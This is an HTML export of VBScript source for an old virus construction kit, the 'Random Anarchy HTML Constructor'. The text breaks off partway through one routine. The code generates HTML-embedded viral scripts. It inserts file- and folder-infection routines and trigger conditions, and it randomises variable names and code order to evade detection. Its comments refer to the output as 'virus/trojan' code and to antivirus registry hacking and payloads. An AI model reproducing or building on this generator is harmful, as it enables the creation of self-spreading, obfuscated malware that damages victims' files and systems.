<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/1999/REC-html401-19991224/strict.dtd">
<html>
<head>
<META http-equiv=Content-Type content="text/html; charset=windows-1252">
<title>Exported from Notepad++</title>
<style type="text/css">
span {
	font-family: 'Courier New';
	font-size: 10pt;
	color: #000000;
}
.sc0 {
}
.sc1 {
	color: #008000;
}
.sc2 {
	font-weight: bold;
	color: #FF0000;
}
.sc3 {
	color: #0000FF;
}
.sc4 {
	color: #808080;
}
.sc6 {
	font-weight: bold;
}
.sc7 {
}
.sc10 {
}
</style>
</head>
<body>
<div style="float: left; white-space: pre; line-height: 1; background: #FFFFFF; "><span class="sc1">'
' Random Anarchy HTML Constructor
'
' v0.11
' Copyright 1998. '1nternal'. All Rights Reserved.
'
' This Script is freeware, you may make as many duplicates/copies
' as you wish and distribute it freely providing all files are included.
'
</span><span class="sc0">
</span><span class="sc1">'Global Variables
</span><span class="sc3">Public</span><span class="sc0"> </span><span class="sc7">LinesCount</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">GenText</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">TabAmount</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">PreID</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">CreatedTxt</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">CreatedFSO</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">FoundParent</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">DirNum</span><span class="sc0">
</span><span class="sc3">Public</span><span class="sc0"> </span><span class="sc7">FoundHostA</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">FoundHost</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">FindHostStyle</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">WSCreated</span><span class="sc0">

</span><span class="sc3">Public</span><span class="sc0"> </span><span class="sc3">Const</span><span class="sc0"> </span><span class="sc7">EngineMajorVer</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc3">Public</span><span class="sc0"> </span><span class="sc3">Const</span><span class="sc0"> </span><span class="sc7">EngineMinorVer</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">
</span><span class="sc3">Public</span><span class="sc0"> </span><span class="sc3">Const</span><span class="sc0"> </span><span class="sc7">EngineRevision</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc3">Public</span><span class="sc0"> </span><span class="sc3">Const</span><span class="sc0"> </span><span class="sc7">EngineMajorDesc</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc4">"rahC"</span><span class="sc0">
</span><span class="sc3">Public</span><span class="sc0"> </span><span class="sc3">Const</span><span class="sc0"> </span><span class="sc7">EngineMinorDesc</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc4">"VBS"</span><span class="sc0">
</span><span class="sc3">Public</span><span class="sc0"> </span><span class="sc3">Const</span><span class="sc0"> </span><span class="sc7">EngineAuthorDesc</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc4">"1nternal"</span><span class="sc0">
</span><span class="sc3">Public</span><span class="sc0"> </span><span class="sc3">Const</span><span class="sc0"> </span><span class="sc7">EngineYearDate</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc4">"1999"</span><span class="sc0">
</span><span class="sc3">Public</span><span class="sc0"> </span><span class="sc7">EngineCopyString</span><span class="sc0">

</span><span class="sc1">'  Sub procedure names
</span><span class="sc3">Public</span><span class="sc0"> </span><span class="sc7">VarInfFileName</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">VarInfFolderName</span><span class="sc0">
</span><span class="sc1">'  Objects and variables
</span><span class="sc3">Public</span><span class="sc0"> </span><span class="sc7">VarWSObj</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">VarFSOObj</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">VarTxtRng</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">VarFileContents</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">VarFolderObj</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">VarFileCollection</span><span class="sc0">
</span><span class="sc3">Public</span><span class="sc0"> </span><span class="sc7">VarVictFileObj</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">VarEachFile</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">VarTestString</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">VarExtType</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">VarTextStreamObj</span><span class="sc0">
</span><span class="sc1">'  Host and victim paths
</span><span class="sc3">Public</span><span class="sc0"> </span><span class="sc7">VarInfPath</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">VarInfFile</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">VarHostPath</span><span class="sc0">

</span><span class="sc7">EngineCopyString</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">EngineMajorDesc</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc4">"."</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">EngineMinorDesc</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc4">" v"</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">EngineMajorVer</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc4">"."</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">EngineMinorVer</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc4">" Copyright "</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">EngineYearDate</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc4">". "</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">EngineAuthorDesc</span><span class="sc0">
</span><span class="sc7">document.write</span><span class="sc0"> </span><span class="sc4">"&lt;p align=""Center""&gt;&lt;font size=""1"" face=""Arial""&gt;Engine: "</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">EngineCopyString</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc4">"&lt;/font&gt;&lt;/p&gt;"</span><span class="sc0">

</span><span class="sc1">'----------------------------Intialisation and Main Layout Block---------------------------------
</span><span class="sc0">
</span><span class="sc1">'Inserts the header and footer code around the virus/trojan
'and calls the exectution probability routine
</span><span class="sc3">Sub</span><span class="sc0"> </span><span class="sc7">GV</span><span class="sc6">()</span><span class="sc0">
    </span><span class="sc3">On</span><span class="sc0"> </span><span class="sc3">Error</span><span class="sc0"> </span><span class="sc3">Resume</span><span class="sc0"> </span><span class="sc3">Next</span><span class="sc0">
    </span><span class="sc3">Call</span><span class="sc0"> </span><span class="sc7">InitialiseIt</span><span class="sc0">
    </span><span class="sc3">if</span><span class="sc0"> </span><span class="sc7">InitialisePlugin</span><span class="sc6">()</span><span class="sc0"> </span><span class="sc3">then</span><span class="sc0">
        </span><span class="sc3">if</span><span class="sc0"> </span><span class="sc7">VInfo.GenSeed.Value</span><span class="sc0"> </span><span class="sc6">&lt;&gt;</span><span class="sc0"> </span><span class="sc4">""</span><span class="sc0"> </span><span class="sc3">then</span><span class="sc0">
            </span><span class="sc7">Rnd</span><span class="sc6">(-</span><span class="sc2">1</span><span class="sc6">)</span><span class="sc0">
            </span><span class="sc7">Randomize</span><span class="sc6">(</span><span class="sc7">VInfo.GenSeed.Value</span><span class="sc6">)</span><span class="sc0">
        </span><span class="sc3">else</span><span class="sc0">
            </span><span class="sc7">Randomize</span><span class="sc0">
        </span><span class="sc3">end</span><span class="sc0"> </span><span class="sc3">if</span><span class="sc0">
        </span><span class="sc3">Call</span><span class="sc0"> </span><span class="sc7">InitialiseAgain</span><span class="sc0">
        </span><span class="sc7">AddLine</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">PreID</span><span class="sc0">
        </span><span class="sc7">AddLine</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"&lt;html&gt;&lt;body&gt;"</span><span class="sc0">
        </span><span class="sc7">AddLine</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"&lt;script Language=""VBScript""&gt;&lt;!--"</span><span class="sc0">
        </span><span class="sc7">AddCodeLine</span><span class="sc0"> </span><span class="sc4">"On Error Resume Next"</span><span class="sc0">
        </span><span class="sc3">Call</span><span class="sc0"> </span><span class="sc7">CustomHeaderCode</span><span class="sc0">
        </span><span class="sc3">Select</span><span class="sc0"> </span><span class="sc3">Case</span><span class="sc0"> </span><span class="sc10">Int</span><span class="sc6">((</span><span class="sc2">6</span><span class="sc0"> </span><span class="sc6">*</span><span class="sc0"> </span><span class="sc7">Rnd</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">+</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc6">)</span><span class="sc0">
            </span><span class="sc3">Case</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
                </span><span class="sc3">Call</span><span class="sc0"> </span><span class="sc7">InsertInfectFile</span><span class="sc0">
                </span><span class="sc3">Call</span><span class="sc0"> </span><span class="sc7">InsertInfectPath</span><span class="sc0">
                </span><span class="sc3">Call</span><span class="sc0"> </span><span class="sc7">InsertExecProb</span><span class="sc0">
            </span><span class="sc3">Case</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">
                </span><span class="sc3">Call</span><span class="sc0"> </span><span class="sc7">InsertInfectPath</span><span class="sc0">
                </span><span class="sc3">Call</span><span class="sc0"> </span><span class="sc7">InsertInfectFile</span><span class="sc0">
                </span><span class="sc3">Call</span><span class="sc0"> </span><span class="sc7">InsertExecProb</span><span class="sc0">
            </span><span class="sc3">Case</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">
                </span><span class="sc3">Call</span><span class="sc0"> </span><span class="sc7">InsertExecProb</span><span class="sc0">
                </span><span class="sc3">Call</span><span class="sc0"> </span><span class="sc7">InsertInfectPath</span><span class="sc0">
                </span><span class="sc3">Call</span><span class="sc0"> </span><span class="sc7">InsertInfectFile</span><span class="sc0">
            </span><span class="sc3">Case</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">
                </span><span class="sc3">Call</span><span class="sc0"> </span><span class="sc7">InsertExecProb</span><span class="sc0">
                </span><span class="sc3">Call</span><span class="sc0"> </span><span class="sc7">InsertInfectFile</span><span class="sc0">
                </span><span class="sc3">Call</span><span class="sc0"> </span><span class="sc7">InsertInfectPath</span><span class="sc0">
            </span><span class="sc3">Case</span><span class="sc0"> </span><span class="sc2">5</span><span class="sc0">
                </span><span class="sc3">Call</span><span class="sc0"> </span><span class="sc7">InsertInfectFile</span><span class="sc0">
                </span><span class="sc3">Call</span><span class="sc0"> </span><span class="sc7">InsertExecProb</span><span class="sc0">
                </span><span class="sc3">Call</span><span class="sc0"> </span><span class="sc7">InsertInfectPath</span><span class="sc0">
            </span><span class="sc3">Case</span><span class="sc0"> </span><span class="sc2">6</span><span class="sc0">
                </span><span class="sc3">Call</span><span class="sc0"> </span><span class="sc7">InsertInfectPath</span><span class="sc0">
                </span><span class="sc3">Call</span><span class="sc0"> </span><span class="sc7">InsertExecProb</span><span class="sc0">
                </span><span class="sc3">Call</span><span class="sc0"> </span><span class="sc7">InsertInfectFile</span><span class="sc0">
        </span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">Select</span><span class="sc0">
        </span><span class="sc3">Call</span><span class="sc0"> </span><span class="sc7">CustomFooterCode</span><span class="sc0">
        </span><span class="sc7">AddLine</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"'HTML.rahC."</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">VInfo.GenName.value</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc4">" v0.1 /"</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">VInfo.IDTag.Value</span><span class="sc0">
        </span><span class="sc7">AddLine</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"'Generated with HTML.rahC v0.1 /1nternal"</span><span class="sc0">
        </span><span class="sc7">AddLine</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"--&gt;&lt;/"</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc4">"script&gt;"</span><span class="sc0">
        </span><span class="sc7">AddLine</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"&lt;/body&gt;&lt;/html&gt;"</span><span class="sc0">
        </span><span class="sc3">if</span><span class="sc0"> </span><span class="sc7">TerminatePlug</span><span class="sc6">()</span><span class="sc0"> </span><span class="sc3">then</span><span class="sc0">
            </span><span class="sc7">window.status</span><span class="sc6">=</span><span class="sc4">"Creating document"</span><span class="sc0">
            </span><span class="sc3">set</span><span class="sc0"> </span><span class="sc7">NewWin</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">window.open</span><span class="sc6">()</span><span class="sc0">
            </span><span class="sc7">NewWin.document.Write</span><span class="sc6">(</span><span class="sc7">GenText</span><span class="sc6">)</span><span class="sc0">
            </span><span class="sc7">window.status</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc4">"Done"</span><span class="sc0">
        </span><span class="sc3">end</span><span class="sc0"> </span><span class="sc3">if</span><span class="sc0">
    </span><span class="sc3">end</span><span class="sc0"> </span><span class="sc3">if</span><span class="sc0">
</span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">Sub</span><span class="sc0">

</span><span class="sc1">'Sets up some variables in preperation for the generation
</span><span class="sc3">Sub</span><span class="sc0"> </span><span class="sc7">InitialiseAgain</span><span class="sc0">
    </span><span class="sc3">On</span><span class="sc0"> </span><span class="sc3">Error</span><span class="sc0"> </span><span class="sc3">Resume</span><span class="sc0"> </span><span class="sc3">Next</span><span class="sc0">
    </span><span class="sc3">if</span><span class="sc0"> </span><span class="sc7">VInfo.RandVars.Checked</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc3">true</span><span class="sc0"> </span><span class="sc3">then</span><span class="sc0">
        </span><span class="sc7">VarInfFolderName</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">GenVar</span><span class="sc0">
        </span><span class="sc7">VarHostPath</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">GenVar</span><span class="sc0">
        </span><span class="sc7">VarWSObj</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">GenVar</span><span class="sc0">
        </span><span class="sc7">VarFSOObj</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">GenVar</span><span class="sc0">
        </span><span class="sc7">VarInfPath</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">GenVar</span><span class="sc0">
        </span><span class="sc7">VarInfFileName</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">GenVar</span><span class="sc0">
        </span><span class="sc7">VarInfFile</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">GenVar</span><span class="sc0">
        </span><span class="sc7">VarFileContents</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">GenVar</span><span class="sc0">
        </span><span class="sc7">VarTxtRng</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">GenVar</span><span class="sc0">
        </span><span class="sc7">VarFolderObj</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">GenVar</span><span class="sc0">
        </span><span class="sc7">VarFileCollection</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">GenVar</span><span class="sc0">
        </span><span class="sc7">VarVictFileObj</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">GenVar</span><span class="sc0">
        </span><span class="sc7">VarTextStreamObj</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">GenVar</span><span class="sc0">
        </span><span class="sc7">VarEachFile</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">GenVar</span><span class="sc0">
        </span><span class="sc7">VarTestString</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">GenVar</span><span class="sc0">
        </span><span class="sc7">VarExtType</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">GenVar</span><span class="sc0">
    </span><span class="sc3">end</span><span class="sc0"> </span><span class="sc3">if</span><span class="sc0">
    </span><span class="sc3">if</span><span class="sc0"> </span><span class="sc7">NameChanges.Exists</span><span class="sc6">(</span><span class="sc7">Ucase</span><span class="sc6">(</span><span class="sc7">VInfo.GenName.Value</span><span class="sc6">))</span><span class="sc0"> </span><span class="sc3">then</span><span class="sc0"> </span><span class="sc7">VInfo.GenName.Value</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">NameChanges.Item</span><span class="sc6">(</span><span class="sc7">Ucase</span><span class="sc6">(</span><span class="sc7">VInfo.GenName.Value</span><span class="sc6">))</span><span class="sc0">
    </span><span class="sc7">PreID</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc4">"&lt;!--"</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">VInfo.IDTag.Value</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc4">"--&gt;"</span><span class="sc0">
</span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">Sub</span><span class="sc0">

</span><span class="sc3">Sub</span><span class="sc0"> </span><span class="sc7">InitialiseIt</span><span class="sc0">
    </span><span class="sc3">On</span><span class="sc0"> </span><span class="sc3">Error</span><span class="sc0"> </span><span class="sc3">Resume</span><span class="sc0"> </span><span class="sc3">Next</span><span class="sc0">
    </span><span class="sc7">TabAmount</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc7">LinesCount</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc7">DirNum</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc7">FoundHostA</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc3">False</span><span class="sc0">
    </span><span class="sc7">FoundHost</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc3">False</span><span class="sc0">
    </span><span class="sc7">FindHostStyle</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc7">CreatedTxt</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc3">False</span><span class="sc0">
    </span><span class="sc7">CreatedFSO</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc3">False</span><span class="sc0">
    </span><span class="sc7">FoundParent</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc3">False</span><span class="sc0">
    </span><span class="sc7">WSCreated</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc3">False</span><span class="sc0">
    </span><span class="sc7">GenText</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc4">""</span><span class="sc0">
    </span><span class="sc7">VarInfFolderName</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc4">"InfectFolder"</span><span class="sc0">
    </span><span class="sc7">VarHostPath</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc4">"HostPath"</span><span class="sc0">
    </span><span class="sc7">VarWSObj</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc4">"WSHShell"</span><span class="sc0">
    </span><span class="sc7">VarFSOObj</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc4">"FSO"</span><span class="sc0">
    </span><span class="sc7">VarInfPath</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc4">"InfectPath"</span><span class="sc0">
    </span><span class="sc7">VarInfFileName</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc4">"InfectFile"</span><span class="sc0">
    </span><span class="sc7">VarInfFile</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc4">"InfectFileName"</span><span class="sc0">
    </span><span class="sc7">VarFileContents</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc4">"FileContents"</span><span class="sc0">
    </span><span class="sc7">VarTxtRng</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc4">"Rng"</span><span class="sc0">
    </span><span class="sc7">VarFolderObj</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc4">"FolderObj"</span><span class="sc0">
    </span><span class="sc7">VarFileCollection</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc4">"fc"</span><span class="sc0">
    </span><span class="sc7">VarVictFileObj</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc4">"fv"</span><span class="sc0">
    </span><span class="sc7">VarTextStreamObj</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc4">"ts"</span><span class="sc0">
    </span><span class="sc7">VarEachFile</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc4">"target"</span><span class="sc0">
    </span><span class="sc7">VarTestString</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc4">"TestString"</span><span class="sc0">
    </span><span class="sc7">VarExtType</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc4">"ExtType"</span><span class="sc0">
</span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">Sub</span><span class="sc0">

</span><span class="sc1">'----------------------------------Main Execution Conditional block------------------------------
</span><span class="sc0">
</span><span class="sc1">'Inserts the offline and random run check to the viral code text stream
'randomly swapping the order of the conditions
</span><span class="sc3">Sub</span><span class="sc0"> </span><span class="sc7">InsertExecProb</span><span class="sc0">
    </span><span class="sc3">Call</span><span class="sc0"> </span><span class="sc7">RandInsertTxtHost</span><span class="sc0">
    </span><span class="sc7">BaseString</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc4">""</span><span class="sc0">
    </span><span class="sc7">BonusString</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc4">""</span><span class="sc0">
    </span><span class="sc7">ConditionalS</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc4">""</span><span class="sc0">
    </span><span class="sc3">if</span><span class="sc0"> </span><span class="sc7">VInfo.ExecOffline.Checked</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc3">True</span><span class="sc0"> </span><span class="sc3">then</span><span class="sc0"> </span><span class="sc7">BaseString</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc4">"location.protocol = ""file:"""</span><span class="sc0">
    </span><span class="sc3">Select</span><span class="sc0"> </span><span class="sc3">Case</span><span class="sc0"> </span><span class="sc7">GetVals</span><span class="sc6">(</span><span class="sc7">VInfo.ExecProb</span><span class="sc6">)</span><span class="sc0">
        </span><span class="sc3">Case</span><span class="sc0"> </span><span class="sc4">"Every"</span><span class="sc0">
            </span><span class="sc7">BonusString</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc4">""</span><span class="sc0">
        </span><span class="sc3">Case</span><span class="sc0"> </span><span class="sc4">"Day"</span><span class="sc0">
            </span><span class="sc7">BonusString</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc4">"Day(now) = "</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">VInfo.DayValExec.Value</span><span class="sc0">
        </span><span class="sc3">Case</span><span class="sc0"> </span><span class="sc4">"Week"</span><span class="sc0">
            </span><span class="sc7">BonusString</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc4">"WeekDay(now) = "</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">VInfo.WeekExec.Value</span><span class="sc0">
        </span><span class="sc3">Case</span><span class="sc0"> </span><span class="sc4">"Misc"</span><span class="sc0">
            </span><span class="sc7">BonusString</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">VInfo.ExecLine.Value</span><span class="sc0">
        </span><span class="sc3">Case</span><span class="sc0"> </span><span class="sc4">"Rand"</span><span class="sc0">
            </span><span class="sc7">BonusString</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc4">"Int(("</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">VInfo.ExecMax.Value</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc4">" * Rnd) + 1) = 1"</span><span class="sc0">
    </span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">Select</span><span class="sc0">      

    </span><span class="sc7">RandOrder</span><span class="sc0"> </span><span class="sc7">RandomAndAdd</span><span class="sc6">(</span><span class="sc7">BaseString</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">BonusString</span><span class="sc6">),</span><span class="sc0"> </span><span class="sc4">"Randomize"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
    </span><span class="sc7">TabAmount</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">TabAmount</span><span class="sc0"> </span><span class="sc6">+</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">

    </span><span class="sc7">HackedRegBegin</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc3">False</span><span class="sc0">
    </span><span class="sc7">HackedRegA</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc3">False</span><span class="sc0">
    </span><span class="sc7">HackedRegB</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc3">False</span><span class="sc0">
    </span><span class="sc7">VCodeChecked</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc3">False</span><span class="sc0">
    </span><span class="sc7">PayLoadChecked</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc3">False</span><span class="sc0">

    </span><span class="sc3">Do</span><span class="sc0">
        </span><span class="sc3">Select</span><span class="sc0"> </span><span class="sc3">Case</span><span class="sc0"> </span><span class="sc10">Int</span><span class="sc6">((</span><span class="sc2">6</span><span class="sc0"> </span><span class="sc6">*</span><span class="sc0"> </span><span class="sc7">Rnd</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">+</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc6">)</span><span class="sc0">
            </span><span class="sc3">Case</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0"> </span><span class="sc3">and</span><span class="sc0"> </span><span class="sc7">HackedRegBegin</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc3">False</span><span class="sc0">
                </span><span class="sc3">Call</span><span class="sc0"> </span><span class="sc7">AVRegHackBegin</span><span class="sc0">
                </span><span class="sc7">HackedRegBegin</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc3">True</span><span class="sc0">
            </span><span class="sc3">Case</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0"> </span><span class="sc3">and</span><span class="sc0"> </span><span class="sc7">PayLoadChecked</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc3">False</span><span class="sc0">
                </span><span class="sc3">if</span><span class="sc0"> </span><span class="sc7">VInfo.TrigInfect.Checked</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc3">False</span><span class="sc0"> </span><span class="sc3">then</span><span class="sc0"> </span><span class="sc3">Call</span><span class="sc0"> </span><span class="sc7">PayLoadCheck</span><span class="sc0">
                </span><span class="sc7">PayLoadChecked</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc3">True</span><span class="sc0">
            </span><span class="sc3">Case</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0"> </span><span class="sc3">and</span><span class="sc0"> </span><span class="sc7">VCodeChecked</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc3">False</span><span class="sc0">
                </span><span class="sc3">Call</span><span class="sc0"> </span><span class="sc7">VCodeCheck</span><span class="sc0">
                </span><span class="sc7">VCodeChecked</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc3">True</span><span class="sc0">
